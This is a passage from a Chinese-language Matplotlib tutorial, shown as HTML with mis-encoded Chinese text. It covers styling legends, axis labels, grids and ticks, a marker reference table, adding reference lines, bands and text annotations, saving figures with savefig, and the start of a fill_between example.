ax.legend() <span class="hljs-comment"># æ˜¾ç¤ºå›¾ä¾‹ï¼Œå¦‚æœæ²¡æœ‰è¿™è¡Œä»£ç å°±ä¸ä¼šæ˜¾ç¤ºå›¾ä¾‹</span>
ax.grid(<span class="hljs-literal">True</span>)  <span class="hljs-comment"># æ˜¾ç¤ºèƒŒæ™¯ç½‘æ ¼</span>

<span class="hljs-comment"># è®¾ç½®æ¬¡åˆ»åº¦ï¼ˆä½¿åæ ‡è½´æ›´ç²¾ç»†ï¼‰</span>
<span class="hljs-keyword">from</span> matplotlib.ticker <span class="hljs-keyword">import</span> AutoMinorLocator
<span class="hljs-comment"># xè½´çš„æ¯ä¸¤ä¸ªä¸»åˆ»åº¦ä¹‹é—´æ”¾å››ä¸ªå°åˆ»åº¦(æ¬¡åˆ»åº¦)</span>
ax.xaxis.set_minor_locator(AutoMinorLocator(<span class="hljs-number">4</span>)) 
<span class="hljs-comment"># yè½´çš„æ¯ä¸¤ä¸ªä¸»åˆ»åº¦ä¹‹é—´æ”¾2ä¸ªå°åˆ»åº¦</span>
<span class="hljs-comment"># ax.yaxis.set_minor_locator(AutoMinorLocator(2))</span>

<span class="hljs-comment"># ax.spines["top"].set_visible(False) # éšè—é¡¶éƒ¨è¾¹æ¡†</span>
<span class="hljs-comment"># ax.spines["right"].set_visible(False)   # éšè—å³ä¾§è¾¹æ¡†</span>

plt.show()
</code></pre>
<p>è¿è¡Œä¸Šè¿°ä»£ç åï¼Œä½ ä¼šå¾—åˆ°å¦‚å›¾4æ‰€ç¤ºçš„å›¾è¡¨ï¼š</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/868c153d2e524036a1132f7edf2c715e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770769621&amp;x-signature=6BWvL6R2ToWHrMdpbcuyV0JveNw%3D" alt="c3.jpg" width="90%" loading="lazy"/></p>
<p>å¦å¤–ï¼Œå›¾ä¾‹ã€åæ ‡è½´æ ‡ç­¾ã€ç½‘æ ¼ç­‰å…ƒç´ éƒ½æ˜¯<strong>é«˜åº¦å¯é…ç½®</strong>çš„ã€‚ä»¥ä¸‹æ˜¯å¸¸ç”¨å‚æ•°çš„è®¾ç½®ç¤ºä¾‹ï¼ˆå¯ä»¥æŒ‰éœ€æ›´æ”¹ï¼‰ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># y è½´æ ‡ç­¾æ ·å¼è®¾ç½®ï¼ˆx è½´ä¸æ ‡é¢˜ç±»ä¼¼ï¼‰</span>
ax.set_ylabel(
    <span class="hljs-string">"y è½´æ ‡ç­¾"</span>,
    fontsize=<span class="hljs-number">15</span>,	  <span class="hljs-comment"># å­—ä½“å¤§å°</span>
    color=<span class="hljs-string">"#991A1A"</span>,  <span class="hljs-comment"># æ–‡å­—é¢œè‰²</span>
    rotation=<span class="hljs-number">0</span>,		  <span class="hljs-comment"># æ–‡å­—æ—‹è½¬è§’åº¦</span>
    alpha=<span class="hljs-number">0.7</span>,		  <span class="hljs-comment"># ä¸é€æ˜åº¦</span>
    fontweight=<span class="hljs-number">500</span>,	  <span class="hljs-comment"># å­—ä½“ç²—ç»†</span>
    labelpad=<span class="hljs-number">15</span>,  	  <span class="hljs-comment"># æ–‡å­—ä¸è½´çº¿ï¼ˆè¾¹æ¡†ï¼‰çš„è·ç¦»</span>
    loc=<span class="hljs-string">"center"</span>,  	  <span class="hljs-comment"># æ–‡å­—æ‰€å¤„ä½ç½®,å¯é€‰å‚æ•°æœ‰ center, left, right, best, top, bottom</span>
)

<span class="hljs-comment"># å›¾ä¾‹æ ·å¼è®¾ç½®</span>
ax.legend(
    loc=<span class="hljs-string">"upper left"</span>,  <span class="hljs-comment"># å›¾ä¾‹ä½ç½®è®¾ç½®ï¼Œå…¶ä»–å¯é€‰å€¼ï¼šupper right lower left center best</span>
    framealpha=<span class="hljs-number">0.5</span>,    <span class="hljs-comment"># è¾¹æ¡†ä¸é€æ˜åº¦</span>
    frameon=<span class="hljs-literal">True</span>,      <span class="hljs-comment"># æ˜¯å¦æ˜¾ç¤ºè¾¹æ¡†</span>
    shadow=<span class="hljs-literal">False</span>, 	   <span class="hljs-comment"># æ˜¯å¦æ˜¾ç¤ºé˜´å½±</span>
    fancybox=<span class="hljs-literal">True</span>,     <span class="hljs-comment"># æ˜¯å¦åœ†è§’è¾¹æ¡†</span>
    fontsize=<span class="hljs-number">10</span>,       <span class="hljs-comment"># å­—ä½“å¤§å°</span>
    title=<span class="hljs-string">"xxxx"</span>,      <span class="hljs-comment"># å›¾ä¾‹æ ‡é¢˜</span>
    title_fontsize=<span class="hljs-string">"large"</span>,	<span class="hljs-comment"># å›¾ä¾‹æ ‡é¢˜å¤§å°</span>
)

<span class="hljs-comment"># ç½‘æ ¼æ˜¾ç¤ºï¼Œå…³äºwhichå’Œaxiså‚æ•°çš„ä½¿ç”¨ç¤ºä¾‹å¯ä»¥æŸ¥çœ‹å›¾4.1</span>
ax.grid(
    <span class="hljs-literal">True</span>,			<span class="hljs-comment"># æ˜¯å¦æ˜¾ç¤ºç½‘æ ¼</span>
    which=<span class="hljs-string">"major"</span>,  <span class="hljs-comment"># ç½‘æ ¼ç±»å‹ï¼ˆåˆ†ä¸»åˆ»åº¦ç½‘æ ¼å’Œæ¬¡åˆ»åº¦ç½‘æ ¼ï¼‰ï¼š'both'ï¼Œ'major'ï¼Œ'minor'</span>
    axis=<span class="hljs-string">"both"</span>,  	<span class="hljs-comment"># åªæ˜¾ç¤ºç‰¹å®šæ–¹å‘çš„èƒŒæ™¯çº¿æ¡ï¼š'both'ï¼Œ'x'ï¼Œ'y'</span>
    linestyle=<span class="hljs-string">"-"</span>,  <span class="hljs-comment"># çº¿å‹</span>
    linewidth=<span class="hljs-number">0.5</span>,  <span class="hljs-comment"># çº¿å®½</span>
    color=<span class="hljs-string">"gray"</span>,  	<span class="hljs-comment"># é¢œè‰²</span>
    alpha=<span class="hljs-number">0.4</span>,  	<span class="hljs-comment"># ä¸é€æ˜åº¦</span>
)
</code></pre>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b5abf04b6173422fb50b6239b077de40~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770769621&amp;x-signature=hMnR3ZIwRxCIM6k%2F%2B0TqcNGNAvA%3D" alt="c5.jpg" width="100%" loading="lazy"/></p>
<p><strong>ç¤ºä¾‹äºŒï¼šè‡ªå®šä¹‰ä¸»åˆ»åº¦ä¸åˆ»åº¦æ ‡ç­¾</strong></p>
<p>åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼ŒMatplotlib ä¼šæ ¹æ®æ•°æ®èŒƒå›´è‡ªåŠ¨è®¾ç½®åˆ»åº¦ä½ç½®ï¼Œä½†å¾ˆå¤šæ—¶å€™æˆ‘ä»¬éœ€è¦æ‰‹åŠ¨æŒ‡å®šåˆ»åº¦ä½ç½®ç”šè‡³è‡ªå®šä¹‰æ ‡ç­¾ã€‚ä¸‹é¢é€šè¿‡å‡ ä¸ªå…¸å‹çš„è®¾ç½®æ¥è¯´æ˜å¦‚ä½•æ“ä½œã€‚</p>
<p>è¿è¡Œä»¥ä¸‹ä»£ç ï¼Œæˆ‘ä»¬å°†æ‰‹åŠ¨è®¾ç½® x è½´å’Œ y è½´çš„åˆ»åº¦ä½ç½®ï¼Œç»“æœå¦‚å›¾5æ‰€ç¤ºã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt
fig, ax = plt.subplots(figsize=(<span class="hljs-number">6</span>, <span class="hljs-number">4</span>))
ax.set_xticks([<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4.5</span>,<span class="hljs-number">10</span>])	<span class="hljs-comment"># è®¾ç½® x è½´çš„ä¸»åˆ»åº¦ä½ç½®</span>
ax.set_yticks([-<span class="hljs-number">5</span>,-<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">3.2</span>,<span class="hljs-number">5</span>])	<span class="hljs-comment"># è®¾ç½® y è½´çš„ä¸»åˆ»åº¦ä½ç½®</span>
plt.show()
</code></pre>
<p>é»˜è®¤åˆ»åº¦ä½äºåæ ‡è½´åº•éƒ¨ï¼ˆx è½´ï¼‰å’Œå·¦ä¾§ï¼ˆy è½´ï¼‰ã€‚å¦‚æœéœ€è¦å°†åˆ»åº¦ç§»åˆ°å¦ä¸€ä¾§ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹æ–¹æ³•ã€‚è¿è¡Œç»“æœå¦‚å›¾6æ‰€ç¤ºã€‚</p>
<pre><code class="hljs language-python" lang="python">ax.xaxis.set_ticks_position(<span class="hljs-string">"top"</span>)    <span class="hljs-comment"># å°† x è½´åˆ»åº¦ç½®äºé¡¶éƒ¨</span>
ax.yaxis.set_ticks_position(<span class="hljs-string">"right"</span>)  <span class="hljs-comment"># å°† y è½´åˆ»åº¦ç½®äºå³ä¾§</span>
<span class="hljs-comment"># å…¶ä»–å¯é€‰å‚æ•°ï¼š'bottom', 'top', 'left', 'right', 'both', 'none'</span>
</code></pre>
<p>é™¤äº†è°ƒæ•´åˆ»åº¦ä½ç½®ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥å®Œå…¨è‡ªå®šä¹‰æ¯ä¸ªåˆ»åº¦å¯¹åº”çš„æ ‡ç­¾ï¼Œå¹¶è®¾ç½®æ ‡ç­¾çš„æ ·å¼ï¼ˆå¦‚æ—‹è½¬ã€å­—ä½“å¤§å°ç­‰ï¼‰ã€‚è¿è¡Œç»“æœå¦‚å›¾7æ‰€ç¤ºã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt
fig, ax = plt.subplots(figsize=(<span class="hljs-number">6</span>, <span class="hljs-number">4</span>))
ax.set_xticks([<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4.5</span>, <span class="hljs-number">10</span>])  <span class="hljs-comment"># è®¾ç½® x è½´çš„ä¸»åˆ»åº¦ä½ç½®</span>
<span class="hljs-comment"># è‡ªå®šä¹‰åˆ»åº¦æ ‡ç­¾æ–‡æœ¬ä¸æ ·å¼ï¼Œè¿™è¡Œä»£ç ä¸€å®šè¦è·Ÿåœ¨set_xticksæ–¹æ³•åé¢</span>
ax.set_xticklabels(    
    [<span class="hljs-string">"æˆ‘æ˜¯0"</span>, <span class="hljs-string">"æˆ‘æ˜¯1"</span>, <span class="hljs-string">"æˆ‘æ˜¯3"</span>, <span class="hljs-string">"æˆ‘æ˜¯4.5"</span>, <span class="hljs-string">"æˆ‘æ˜¯10"</span>],
    rotation=-<span class="hljs-number">45</span>,                   <span class="hljs-comment"># æ ‡ç­¾æ—‹è½¬ -45 åº¦</span>
    fontsize=<span class="hljs-number">10</span>,                    <span class="hljs-comment"># æ ‡ç­¾å­—ä½“å¤§å°</span>
)
plt.show()
</code></pre>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/df46237706934081bc2bf20ec87a504e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770769621&amp;x-signature=yvfrHUg945%2FGr%2BQfU2McQCHJ0As%3D" alt="c4.jpg" width="100%" loading="lazy"/></p>
<p><strong>å¸¸ç”¨æ ‡è®°ç‚¹æ ·å¼<code>marker</code>é€ŸæŸ¥è¡¨ï¼š</strong></p>
<p>ç»˜åˆ¶æ•£ç‚¹å›¾æˆ–æŠ˜çº¿å›¾æ—¶ï¼Œ<code>marker</code> å‚æ•°ç”¨äºæŒ‡å®šæ•°æ®ç‚¹çš„å½¢çŠ¶ã€‚ä¸‹è¡¨åˆ—å‡ºæœ€å¸¸ç”¨çš„å‡ ç§æ ·å¼ï¼š</p>





















































































<table><thead><tr><th>å‚æ•°å€¼</th><th>æ ·å¼æè¿°</th><th>å›¾ç¤º</th></tr></thead><tbody><tr><td><code>'.'</code></td><td>ç‚¹</td><td>â— (å°åœ†ç‚¹)</td></tr><tr><td><code>'o'</code></td><td>åœ†åœˆ</td><td>â—‹ (ç©ºå¿ƒåœ†)</td></tr><tr><td><code>'s'</code></td><td>æ­£æ–¹å½¢</td><td>â–¡</td></tr><tr><td><code>'D'</code></td><td>é’»çŸ³å½¢</td><td>â—†</td></tr><tr><td><code>'^'</code></td><td>æ­£ä¸‰è§’å½¢</td><td>â–³</td></tr><tr><td><code>'v'</code></td><td>å€’ä¸‰è§’å½¢</td><td>â–½</td></tr><tr><td><code>'&gt;'</code></td><td>å³ä¸‰è§’å½¢</td><td>â–¶</td></tr><tr><td><code>'&lt;'</code></td><td>å·¦ä¸‰è§’å½¢</td><td>â—€</td></tr><tr><td><code>'p'</code></td><td>äº”è¾¹å½¢</td><td>â¬ </td></tr><tr><td><code>'*'</code></td><td>æ˜Ÿå·</td><td>â˜…</td></tr><tr><td><code>'h'</code></td><td>å…­è¾¹å½¢1</td><td>â¬¡</td></tr><tr><td><code>'H'</code></td><td>å…­è¾¹å½¢2</td><td>â¬¢</td></tr><tr><td><code>'+'</code></td><td>åŠ å·</td><td>ï¼‹</td></tr><tr><td><code>'x'</code></td><td>ä¹˜å·</td><td>Ã—</td></tr><tr><td><code>'d'</code></td><td>å°é’»çŸ³</td><td>â™¦</td></tr></tbody></table>
<h4 data-id="heading-6">2.4 å¸¸ç”¨è¾…åŠ©å…ƒç´ </h4>
<p>è¾…åŠ©å…ƒç´ åŒ…æ‹¬å‚è€ƒçº¿ã€å‚è€ƒåŒºé—´å¸¦ã€æ–‡æœ¬æ ‡æ³¨ç­‰ï¼Œå®ƒä»¬èƒ½å¤Ÿå¸®åŠ©è¯»è€…æ›´æ¸…æ™°åœ°ç†è§£å›¾è¡¨ä¸­çš„å…³é”®ä½ç½®æˆ–èŒƒå›´ã€‚ä¸‹é¢é€šè¿‡ä¸€ä¸ªä¾‹å­æ¼”ç¤ºå¦‚ä½•æ·»åŠ è¿™äº›å…ƒç´ ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt
fig, ax = plt.subplots(figsize=(<span class="hljs-number">6</span>, <span class="hljs-number">4</span>))

<span class="hljs-comment"># å†ç»˜åˆ¶ä¸€éä¸Šæ–‡ä¸­çš„ä¸€å…ƒä¸‰æ¬¡å‡½æ•°</span>
<span class="hljs-comment"># =====================================</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">apply_function_to_vector</span>(<span class="hljs-params">values, func</span>):
    <span class="hljs-keyword">return</span> [func(value) <span class="hljs-keyword">for</span> value <span class="hljs-keyword">in</span> values]

<span class="hljs-keyword">def</span> <span class="hljs-title function_">cubic_polynomial</span>(<span class="hljs-params">x</span>):
    <span class="hljs-keyword">return</span> <span class="hljs-number">0.5</span> * x**<span class="hljs-number">3</span> + x**<span class="hljs-number">2</span> - x + <span class="hljs-number">2</span>

<span class="hljs-keyword">def</span> <span class="hljs-title function_">generate_range</span>(<span class="hljs-params">start, end, step</span>):
    <span class="hljs-keyword">return</span> [start + i * step <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">int</span>((end - start) / step))]

x = generate_range(-<span class="hljs-number">3</span>,<span class="hljs-number">1.5</span>,<span class="hljs-number">0.05</span>)
y = apply_function_to_vector(x, cubic_polynomial)
ax.plot(x, y)
<span class="hljs-comment"># =====================================</span>

<span class="hljs-comment"># æ·»åŠ ä¸€æ¡æ°´å¹³å‚è€ƒçº¿</span>
ax.axhline(
    y=<span class="hljs-number">4.0</span>,               <span class="hljs-comment"># å‚è€ƒçº¿æ‰€åœ¨çš„ y åæ ‡</span>
    color=<span class="hljs-string">"#B92D2D"</span>,     <span class="hljs-comment"># é¢œè‰²ï¼ˆçº¢è‰²ï¼‰</span>
    linestyle=<span class="hljs-string">"--"</span>,      <span class="hljs-comment"># çº¿å‹ï¼šè™šçº¿</span>
    linewidth=<span class="hljs-number">1</span>,         <span class="hljs-comment"># çº¿å®½</span>
    alpha=<span class="hljs-number">0.5</span>,           <span class="hljs-comment"># ä¸é€æ˜åº¦</span>
)

<span class="hljs-comment"># æ·»åŠ ä¸€æ¡å‚ç›´å‚è€ƒçº¿</span>
ax.axvline(
    x=-<span class="hljs-number">2</span>,                <span class="hljs-comment"># å‚è€ƒçº¿æ‰€åœ¨çš„ x åæ ‡</span>
    color=<span class="hljs-string">"#1D9B43"</span>,     <span class="hljs-comment"># é¢œè‰²ï¼ˆç»¿è‰²ï¼‰</span>
    linestyle=<span class="hljs-string">"--"</span>, 
    linewidth=<span class="hljs-number">1</span>,
)

<span class="hljs-comment"># æ·»åŠ ä¸€æ¡å¯¹è§’å‚è€ƒçº¿</span>
ax.axline(
    (<span class="hljs-number">0</span>, <span class="hljs-number">2</span>),        <span class="hljs-comment"># è¿‡(0,2)ç‚¹</span>
    slope=-<span class="hljs-number">0.8</span>,    <span class="hljs-comment"># ä½œä¸€æ¡æ–œç‡ä¸º-0.8çš„å‚è€ƒçº¿</span>
    color=<span class="hljs-string">"gray"</span>, 
    linestyle=<span class="hljs-string">"--"</span>, 
    linewidth=<span class="hljs-number">0.5</span>
)

<span class="hljs-comment"># æ·»åŠ æ°´å¹³å‚è€ƒåŒºé—´å¸¦ï¼ˆå¸¸ç”¨äºè¡¨ç¤ºç½®ä¿¡åŒºé—´æˆ–ç›®æ ‡èŒƒå›´ï¼‰</span>
ax.axhspan(
    ymin=<span class="hljs-number">0.5</span>,            <span class="hljs-comment"># åŒºé—´ä¸‹ç•Œ</span>
    ymax=<span class="hljs-number">1.2</span>,            <span class="hljs-comment"># åŒºé—´ä¸Šç•Œ</span>
    facecolor=<span class="hljs-string">"green"</span>, 	 <span class="hljs-comment"># åŒºé—´é¢œè‰²</span>
    alpha=<span class="hljs-number">0.2</span>            <span class="hljs-comment"># è¾ƒä½çš„é€æ˜åº¦ä½¿èƒŒæ™¯ä¸è¢«è¿‡åº¦çªå‡º</span>
) 

<span class="hljs-comment"># æ·»åŠ å‚ç›´å‚è€ƒåŒºé—´å¸¦</span>
ax.axvspan(xmin=-<span class="hljs-number">1.2</span>, xmax=-<span class="hljs-number">0.3</span>, facecolor=<span class="hljs-string">"red"</span>, alpha=<span class="hljs-number">0.1</span>)

<span class="hljs-comment"># åœ¨å›¾è¡¨ä¸­æ·»åŠ æ–‡æœ¬æ ‡æ³¨</span>
<span class="hljs-comment"># å¦‚ä¸‹é…ç½®é¡¹ä¼—å¤šï¼Œæ¨èç›´æ¥ç»™AIæä¾›ä½ çš„éœ€æ±‚ï¼Œè®©AIå¸®ä½ å†™å¦‚ä¸‹é…ç½®é¡¹</span>
bbox_props = <span class="hljs-built_in">dict</span>(
    boxstyle=<span class="hljs-string">"round"</span>,     <span class="hljs-comment"># åœ†è§’æ–‡æœ¬æ¡†</span>
    facecolor=<span class="hljs-string">"white"</span>,    <span class="hljs-comment"># å¡«å……è‰²</span>
    edgecolor=<span class="hljs-string">"black"</span>,    <span class="hljs-comment"># è¾¹æ¡†é¢œè‰²</span>
    linewidth=<span class="hljs-number">1</span>,          <span class="hljs-comment"># è¾¹æ¡†å®½åº¦</span>
    alpha=<span class="hljs-number">0.8</span>,            <span class="hljs-comment"># æ•´ä½“é€æ˜åº¦</span>
    pad=<span class="hljs-number">0.4</span>,              <span class="hljs-comment"># æ–‡æœ¬ä¸è¾¹æ¡†çš„å†…è¾¹è·</span>
)
ax.text(
    <span class="hljs-number">0.0</span>,                  <span class="hljs-comment"># æ–‡æœ¬æ¡†é”šç‚¹çš„ x åæ ‡ï¼ˆæ•°æ®åæ ‡ç³»ï¼‰</span>
    <span class="hljs-number">3.6</span>,                  <span class="hljs-comment"># æ–‡æœ¬æ¡†é”šç‚¹çš„ y åæ ‡</span>
    <span class="hljs-string">"Your Text"</span>,          <span class="hljs-comment"># æ–‡æœ¬å†…å®¹</span>
    fontsize=<span class="hljs-number">10</span>, 		  <span class="hljs-comment"># æ–‡å­—å¤§å°</span>
    fontfamily=<span class="hljs-string">"serif"</span>,   <span class="hljs-comment"># è¡¬çº¿å­—ä½“</span>
    fontstyle=<span class="hljs-string">"italic"</span>,   <span class="hljs-comment"># æ–œä½“</span>
    fontweight=<span class="hljs-string">"bold"</span>,    <span class="hljs-comment"># ç²—ä½“</span>
    color=<span class="hljs-string">"black"</span>,        <span class="hljs-comment"># å­—ä½“é¢œè‰²</span>
    ha=<span class="hljs-string">"left"</span>,            <span class="hljs-comment"># æ°´å¹³å¯¹é½æ–¹å¼ï¼šå·¦å¯¹é½</span>
    va=<span class="hljs-string">"bottom"</span>,          <span class="hljs-comment"># å‚ç›´å¯¹é½æ–¹å¼ï¼šåº•éƒ¨å¯¹é½</span>
    rotation=<span class="hljs-number">0</span>,           <span class="hljs-comment"># æ–‡æœ¬æ—‹è½¬è§’åº¦ï¼ˆåº¦ï¼‰</span>
    bbox=bbox_props,      <span class="hljs-comment"># åº”ç”¨ä¸Šè¿°æ–‡æœ¬æ¡†æ ·å¼</span>
)

plt.show()
</code></pre>
<p>è¿è¡Œç»“æœå¦‚å›¾8æ‰€ç¤ºã€‚</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/60f047add4484a249a372a8a8de3563b~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770769621&amp;x-signature=VPxb6vbdsLuqOjuNI3ILJH%2B4V24%3D" alt="c6.jpg" width="70%" loading="lazy"/></p>
<h4 data-id="heading-7">2.5 ä¿å­˜ä¸ºå›¾ç‰‡</h4>
<p>ç»˜åˆ¶å®Œæˆåï¼Œæˆ‘ä»¬é€šå¸¸éœ€è¦å°†å›¾è¡¨ä¿å­˜ä¸ºå›¾ç‰‡æ–‡ä»¶ä»¥ä¾¿åœ¨æŠ¥å‘Šã€æ–‡ç« æˆ–æ¼”ç¤ºä¸­ä½¿ç”¨ã€‚é™¤äº†æ‰‹åŠ¨æˆªå›¾ï¼Œæ›´è§„èŒƒçš„åšæ³•æ˜¯åœ¨ç¨‹åºçš„ç»“å°¾ä½¿ç”¨ <code>plt.savefig()</code> å‡½æ•°ã€‚è¯¥å‡½æ•°æ”¯æŒå¤šç§æ ¼å¼ï¼ˆPNGã€PDFã€SVG ç­‰ï¼‰å’Œä¸°å¯Œçš„è¾“å‡ºè®¾ç½®ã€‚</p>
<pre><code class="hljs language-python" lang="python">plt.savefig(
    <span class="hljs-string">"output.png"</span>,               <span class="hljs-comment"># æ–‡ä»¶è·¯å¾„ï¼Œæ”¯æŒå¤šç§å›¾ç‰‡åç¼€ï¼ˆå¯ä½¿ç”¨ç›¸å¯¹æˆ–ç»å¯¹è·¯å¾„ï¼‰</span>
    dpi=<span class="hljs-number">300</span>,                    <span class="hljs-comment"># åˆ†è¾¨ç‡ï¼Œæ•°å€¼è¶Šé«˜å›¾ç‰‡è¶Šæ¸…æ™°</span>
    bbox_inches=<span class="hljs-string">"tight"</span>,        <span class="hljs-comment"># è‡ªåŠ¨è£å‰ªå›¾è¡¨å‘¨å›´å¤šä½™çš„ç©ºç™½åŒºåŸŸ</span>
    facecolor=<span class="hljs-string">"white"</span>,          <span class="hljs-comment"># ç”»å¸ƒèƒŒæ™¯é¢œè‰²</span>
    edgecolor=<span class="hljs-string">"none"</span>,           <span class="hljs-comment"># ç”»å¸ƒè¾¹ç¼˜é¢œè‰²</span>
    transparent=<span class="hljs-literal">False</span>,          <span class="hljs-comment"># è‹¥ä¸º Trueï¼Œåˆ™èƒŒæ™¯é€æ˜ï¼ˆé€‚åˆå åŠ åœ¨å…¶ä»–å›¾ä¸Šï¼‰</span>
    orientation=<span class="hljs-string">"portrait"</span>,     <span class="hljs-comment"># çº¸å¼ æ–¹å‘ï¼š'portrait'ï¼ˆçºµå‘ï¼‰æˆ– 'landscape'ï¼ˆæ¨ªå‘ï¼‰</span>
    metadata={                  <span class="hljs-comment"># å¯é€‰çš„å…ƒæ•°æ®ï¼Œä¼šåµŒå…¥åˆ°å›¾ç‰‡æ–‡ä»¶ä¸­</span>
        <span class="hljs-string">"Title"</span>: <span class="hljs-string">"Experimental Results"</span>,
        <span class="hljs-string">"Author"</span>: <span class="hljs-string">"Ming"</span>,
        <span class="hljs-string">"Copyright"</span>: <span class="hljs-string">"CC-BY 4.0"</span>,
    },
)
</code></pre>
<p>è¿™æ ·çš„è¯ï¼Œè¿è¡Œå®Œç¨‹åºåï¼Œå°±ä¼šå°†å›¾è¡¨ä¿å­˜ä¸ºå›¾ç‰‡å­˜æ”¾åœ¨ä½ æŒ‡å®šçš„ä½ç½®ã€‚</p>
<h3 data-id="heading-8">ä¸‰. è¿›é˜¶ç»˜å›¾æ“ä½œ</h3>
<h4 data-id="heading-9">3.1 åŒºé—´å¡«å……</h4>
<p>åŒºé—´å¡«å……ï¼ŒæŒ‡çš„æ˜¯åœ¨ç»™å®šçš„ <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi></mrow><annotation encoding="application/x-tex">x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">x</span></span></span></span></span> åŒºé—´å†…ï¼Œæ ¹æ®è¯¥åŒºé—´å¯¹åº”çš„ä¸Šä¸‹è¾¹ç•Œå€¼ï¼Œå°†å…¶ä¹‹é—´çš„åŒºåŸŸç”¨é¢œè‰²æˆ–å›¾æ¡ˆè¿›è¡Œå¡«å……ã€‚è¿™ç§å¯è§†åŒ–æ–¹æ³•å¸¸ç”¨äºè¡¨ç¤ºè¯¯å·®èŒƒå›´ã€ç½®ä¿¡åŒºé—´ã€å‡½æ•°åŒ…å›´åŒºåŸŸç­‰ï¼Œèƒ½ç›´è§‚åœ°å±•ç¤ºæ•°æ®æˆ–å‡½æ•°åœ¨æŸä¸€èŒƒå›´å†…çš„æ³¢åŠ¨æƒ…å†µã€‚ä¸‹å›¾ 9 å±•ç¤ºäº†ä¸€ä¸ªå…¸å‹çš„åŒºé—´å¡«å……æ•ˆæœï¼š</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/bc995912e79441ba91c12ac62c0729ec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1770769621&amp;x-signature=APa7tde25CkmaTRVSq%2BcZrwRF4E%3D" alt="c7.jpg" width="100%" loading="lazy"/></p>
<p>è¦å®ç°ä¸Šé¢çš„æ•ˆæœä¹Ÿå¾ˆç®€å•ï¼Œåœ¨ Matplotlib ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ <code>ax.fill_between()</code> å‡½æ•°è½»æ¾å®ç°è¿™ä¸€æ•ˆæœã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªåŸºç¡€ç¤ºä¾‹ï¼š</p>
<pre><code class="hljs language-python" lang="python">fig, ax = plt.subplots(figsize=(<span class="hljs-number">6</span>, <span class="hljs-number">4</span>))
x = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]
y_up = [<span class="hljs-number">2</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>]
y_down = [<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, <span class="hljs-number">2</span>]

<span class="hljs-comment"># ç»˜åˆ¶ä¸Šä¸‹ä¸¤æ¡æŠ˜çº¿</span>
ax.plot(x, y_up)
ax.plot(x, y_down)

<span class="hljs-comment"># å¡«å……ä¸¤æ¡çº¿ä¹‹é—´çš„åŒºåŸŸ</span>
ax.fill_between(
    x,              <span class="hljs-comment"># x åæ ‡åºåˆ—</span>
    y_up,           <span class="hljs-comment"># ä¸Šè¾¹ç•Œ y å€¼</span>
    y_down,         <span class="hljs-comment"># ä¸‹è¾¹ç•Œ y å€¼</span>
    color=<span class="hljs-string">'#2ca02c'</span>, <span class="hljs-comment"># å¡«å……é¢œè‰²</span>
    alpha=<span class="hljs-number">0.2</span>       <span class="hljs-comment"># ä¸é€æ˜åº¦</span>
)
</code></pre>
<p>å†æ¥çœ‹ä¸€ä¸ªä¾‹å­ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-comment"># å®šä¹‰ä¸¤ä¸ªå¤šé¡¹å¼å‡½æ•°</span>
<span class="hljs-comment"># ä¸€å…ƒä¸‰æ¬¡å‡½æ•°</span>
<span class="hljs-keyword">def</span> <span class="hljs-title function_">cubic_polynomial</span>(<span class="hljs-params">x</span>):
    <span class="hljs-keyword">return</span> <span class="hljs-number">0.5</span> * x**<span class="hljs-number">3</span> + x**<span class="hljs-number">2</span> - x + <span class="hljs-number">2</span>
<span class="hljs-comment"># ä¸€å…ƒäºŒæ¬¡å‡½æ•°</span>
